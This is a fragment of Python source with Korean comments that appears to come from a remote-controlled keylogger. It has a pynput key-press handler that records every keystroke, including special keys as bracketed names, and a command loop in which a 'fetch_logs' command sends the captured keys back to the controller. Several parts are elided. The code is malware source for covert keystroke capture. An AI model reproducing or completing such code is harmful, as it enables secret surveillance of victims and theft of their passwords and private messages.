    ...
    def on_press(self, key):
        try:
            if key == keyboard.Key.space:
                self.log.append(" ")  # 스페이스바는 띄어쓰기 처리
            elif hasattr(key, 'char') and key.char is not None:
                self.log.append(key.char)
            else:
                self.log.append(f"[{key.name}]")  # 특수키는 [키이름] 형태로 저장
    ...
    while True:
        try:
            ...
            while True:
                ...
                elif command.lower() == "fetch_logs":
                    # 키 입력 로그 전송
                    logs = keylogger.fetch_logs()
                    result = f"Key Logs:\n{logs}"
